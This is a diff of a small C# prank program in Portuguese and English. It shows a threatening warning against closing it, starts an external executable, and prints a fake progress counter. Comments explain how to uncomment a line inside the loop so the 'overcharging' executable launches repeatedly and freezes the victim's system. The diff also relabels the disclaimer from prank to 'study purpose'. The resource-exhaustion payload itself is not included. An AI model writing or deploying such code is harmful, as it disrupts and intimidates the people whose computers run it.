@@ -1,5 +1,5 @@
 //Visual Studio 2015
-//This code was made just for kidding or to make a prank! I'm not responsible if something went wrong! Execute with your own risk!
+//This code was made just for a study purpose, for understand how we can overload a system!! I'm not responsible if something went wrong! Execute with your own risk!
 //Esse código foi feito com o intuito de fazer uma brincadeira! Eu não sou responsável se alguma coisa de errado ocorer, execute pela sua própria conta e risco!
 
 using System;
@@ -20,14 +20,14 @@ namespace Trava_Tuto
             Console.WriteLine("Bem-Vindo!");
             Console.WriteLine("Aperte qualquer tecla, para iniciar!");
             Console.ReadKey();
-            Console.WriteLine("Pronto para hackear seu sistema!");
+            Console.WriteLine("");  //You can put a prank message here! Or just comment this line!
             Console.ForegroundColor = ConsoleColor.DarkYellow;
             Console.WriteLine("Se tentar fechar, vai ser pior!");
             System.Diagnostics.Process.Start(@"C:\Users\CLIENTE\Documents\Visual Studio 2015\Projects\Calculadora Cientifica\B.exe");
 
-            for (cont = 0; cont <= 100; cont++) {
+            for (cont = 0; cont <= 100; cont++) {  //Here we have a fake "load progress" 
                 Console.ForegroundColor = ConsoleColor.DarkGreen;
-                Console.WriteLine("Hackeando sistema" + cont+"%");
+                Console.WriteLine("" + cont+"%");  //You can put a prank message here!
                 //Just use the line below, for freeze the system! You need change the location of your .exe archive with your overcharging code!
                 //Use a linha abaixo, para congelar o sistema! Você precisa mudar o diretório do seu arquivo .exe com seu executável de sobrecarga!
                 //System.Diagnostics.Process.Start(@"C:\Users\CLIENTE\Documents\Visual Studio 2015\Projects\Calculadora Cientifica\B.exe");
